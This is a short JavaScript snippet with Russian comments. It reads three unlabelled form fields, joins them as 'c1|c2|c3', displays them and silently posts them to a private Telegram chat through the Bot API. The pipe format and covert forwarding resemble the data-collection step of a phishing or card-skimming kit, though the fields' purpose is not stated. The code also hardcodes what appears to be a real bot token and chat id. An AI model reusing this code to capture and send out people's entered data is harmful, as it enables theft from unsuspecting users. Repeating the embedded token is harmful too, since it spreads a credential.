function submitData() {
    // Получаем значения из полей ввода
    const c1 = document.getElementById('c1').value;
    const c2 = document.getElementById('c2').value;
    const c3 = document.getElementById('c3').value;

    // Формируем строку для вывода
    const outputString = `${c1}|${c2}|${c3}`;

    // Выводим результат на страницу
    document.getElementById('output').textContent = outputString;

    // Отправляем данные в Telegram-бота
    sendToTelegramBot(c1, c2, c3);
}

function sendToTelegramBot(c1, c2, c3) {
    // Ваш токен и chat_id
    const botToken = "8110531095:AAH0nakl2X7w-Ad4Wcik6W_yGR1klOaASQE";
    const chatId = "5311186042"; // Замените на ваш chat_id

    // Формируем сообщение
    const message = `Данные: ${c1}|${c2}|${c3}`;

    // Отправляем сообщение через Telegram Bot API
    fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
        method: 'POST',
        headers: {
            'Content-Type': 'application/json'
        },
        body: JSON.stringify({
            chat_id: chatId,
            text: message
        })
    })
    .then(response => response.json())
    .then(data => {
        console.log('Сообщение отправлено:', data);
    })
    .catch(error => {
        console.error('Ошибка:', error);
    });
}
